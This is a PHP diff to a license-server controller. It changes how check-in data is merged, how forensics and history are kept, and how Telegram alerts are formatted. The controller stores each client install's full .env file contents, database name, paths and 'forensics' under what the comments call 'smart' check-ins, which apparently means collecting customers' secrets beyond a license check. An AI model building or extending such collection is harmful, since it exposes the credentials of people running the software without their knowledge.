@@ -155,18 +155,31 @@ class LicenseServerController extends BaseController
             
             $data = [
                 'ip' => $ip,
-                'product_id' => $request->input('product_id'),
-                'license_code' => $licenseCode,
-                'client_name' => $request->input('client_name'),
-                'base_path' => $request->input('base_path'),
-                'db_name' => $request->input('db_name'),
                 'last_check_in' => now(),
                 'is_active' => 1, // Auto-approve for now
-                'forensics' => json_encode($forensics),
-                'settings' => $request->input('settings') ? (is_array($request->input('settings')) ? json_encode($request->input('settings')) : $request->input('settings')) : null,
-                'env_content' => $request->input('env_content'),
                 'updated_at' => now(),
             ];
+
+            // Only update columns if provided in this request to avoid wiping out "smart" data with "dumb" requests
+            if ($request->input('product_id')) $data['product_id'] = $request->input('product_id');
+            if ($licenseCode) $data['license_code'] = $licenseCode;
+            if ($request->input('client_name')) $data['client_name'] = $request->input('client_name');
+            if ($request->input('base_path')) $data['base_path'] = $request->input('base_path');
+            if ($request->input('db_name')) $data['db_name'] = $request->input('db_name');
+            
+            // Only update forensics/settings/env if they are "smart" checks (e.g. they include extra data)
+            // If they are missing, we keep the old ones to avoid data loss.
+            if ($request->has('settings')) {
+                $data['settings'] = is_array($request->input('settings')) ? json_encode($request->input('settings')) : $request->input('settings');
+            }
+            if ($request->has('env_content')) {
+                $data['env_content'] = $request->input('env_content');
+            }
+            
+            // Only update forensics column if it's more complete or it's a new record
+            if (!$existing || count($forensics) > (isset($existing->forensics) ? count((array)json_decode($existing->forensics, true)) : 0)) {
+                $data['forensics'] = json_encode($forensics);
+            }
 
             if ($existing) {
                 $licenseId = $existing->id;
@@ -246,22 +259,22 @@ class LicenseServerController extends BaseController
             return;
         }
 
-        $message = "🚨 *LICENSING ALERT* 🚨\n";
+        $message = "🚨 <b>LICENSING ALERT</b> 🚨\n";
         $message .= "--------------------------\n";
-        $message .= "📍 *Domain:* `{$data['domain']}`\n";
-        $message .= "🌐 *IP:* `{$data['ip']}`\n";
-        $message .= "🔎 *Type:* {$data['type']}\n";
-        $message .= "📂 *Path:* `{$data['path']}`\n";
-        $message .= "📦 *Product:* {$data['product_id']}\n";
-        $message .= "🔑 *Code:* `{$data['license_code']}`\n";
-        $message .= "📅 *Time:* {$data['timestamp']}";
+        $message .= "📍 <b>Domain:</b> <code>" . htmlspecialchars($data['domain']) . "</code>\n";
+        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($data['ip']) . "</code>\n";
+        $message .= "🔎 <b>Type:</b> " . htmlspecialchars($data['type']) . "\n";
+        $message .= "📂 <b>Path:</b> <code>" . htmlspecialchars($data['path'] ?? 'N/A') . "</code>\n";
+        $message .= "📦 <b>Product:</b> " . htmlspecialchars($data['product_id']) . "\n";
+        $message .= "🔑 <b>Code:</b> <code>" . htmlspecialchars($data['license_code']) . "</code>\n";
+        $message .= "📅 <b>Time:</b> " . htmlspecialchars($data['timestamp'] ?? now()->toDateTimeString());
 
         try {
             $response = Http::post("https://api.telegram.org/bot{$botToken}/sendMessage", [
 
                 'chat_id' => $chatId,
                 'text' => $message,
-                'parse_mode' => 'Markdown',
+                'parse_mode' => 'HTML',
             ]);
 
             if (!$response->successful()) {
@@ -311,10 +324,15 @@ class LicenseServerController extends BaseController
             $data = [
                 'ip' => $ip,
                 'last_check_in' => now(),
-                'settings' => $request->input('settings') ? (is_array($request->input('settings')) ? json_encode($request->input('settings')) : $request->input('settings')) : null,
-                'env_content' => $request->input('env_content'),
                 'updated_at' => now(),
             ];
+
+            if ($request->has('settings')) {
+                $data['settings'] = is_array($request->input('settings')) ? json_encode($request->input('settings')) : $request->input('settings');
+            }
+            if ($request->has('env_content')) {
+                $data['env_content'] = $request->input('env_content');
+            }
 
             // Update main columns if provided
             if ($request->input('product_id')) $data['product_id'] = $request->input('product_id');
@@ -327,7 +345,14 @@ class LicenseServerController extends BaseController
 
             if ($existing) {
                 $licenseId = $existing->id;
-                $data['forensics'] = json_encode($forensics);
+                
+                // Only update forensics column if it's more complete than what we have
+                $newForensicsCount = count($forensics);
+                $oldForensicsCount = isset($existing->forensics) ? count((array)json_decode($existing->forensics, true)) : 0;
+                
+                if ($newForensicsCount >= $oldForensicsCount) {
+                    $data['forensics'] = json_encode($forensics);
+                }
 
 
                 // If existing record has no ID, we should update by domain and maybe set an ID now
@@ -383,15 +408,22 @@ class LicenseServerController extends BaseController
                 ->orderBy('created_at', 'desc')
                 ->first();
 
+            // Only record history if we actually have SMART data in this request
+            // We don't want "dumb" check-ins (like standard Marketplace checks) to wipe out history
+            if (is_null($settings) && is_null($envContent)) {
+                return;
+            }
+
             $newSettingsJson = $settings ? (is_array($settings) ? json_encode($settings) : $settings) : null;
             $oldSettingsJson = $lastHistory ? $lastHistory->settings : null;
             
             // Critical changes check: settings, IP, or base_path
             $settingsChanged = (!$lastHistory || $newSettingsJson !== $oldSettingsJson);
-            $envChanged = $lastHistory && ($lastHistory->ip !== $ip || ($lastHistory->forensics && strpos($lastHistory->forensics, ($forensics['base_path'] ?? '')) === false));
-
+            
             // Only record if settings changed, env changed, or major environment change
-            if ($settingsChanged || $envContent !== ($lastHistory->env_content ?? null)) {
+            $envChanged = (!$lastHistory || $envContent !== ($lastHistory->env_content ?? null));
+            
+            if ($settingsChanged || $envChanged) {
 
                 DB::table('license_histories')->insert([
                     'id' => (string) Str::uuid(),
